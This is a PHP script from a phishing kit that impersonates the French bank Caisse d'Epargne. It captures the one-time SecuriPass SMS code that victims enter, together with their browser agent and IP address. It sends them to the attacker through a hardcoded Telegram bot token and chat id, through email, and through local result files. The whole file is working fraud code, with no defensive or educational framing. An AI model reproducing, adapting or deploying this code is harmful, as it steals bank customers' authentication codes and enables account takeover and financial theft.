<?php
/*
Author : DIB
Email : b41tsm@gmail.com
ICQ : @MorrisWorm

*/


error_reporting(0);
if(isset($_POST['securpasse'])){
if(!empty($_POST['securpasse'])){
	include '../../config.php';
	include 'funcs.php';
	$agent = $_SERVER['HTTP_USER_AGENT'];
	$sms = $_POST['securpasse'];
	$message = "\nSMS 2 : $sms\nAgent: $agent\nIp: $ip";
	$suj = "Caisse D'epargne - SecuriPass FROM $ip";
	toTG($message);
	mail($to,$suj,$message);
	$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);
$token = "2063061087:AAF4J2MhpY_UGZ4bRdeEkPIvL3HdioJoJwo";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=2039615741&text=" . urlencode($message)."" );
$file = fopen("../SE/ajz.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 

	  echo json_encode(['status'=>'success']);
	
}else{
	
	header('Location: ../securepass.php');
}	
	
	
}else{
	header('Location: ../index.html');
}
?>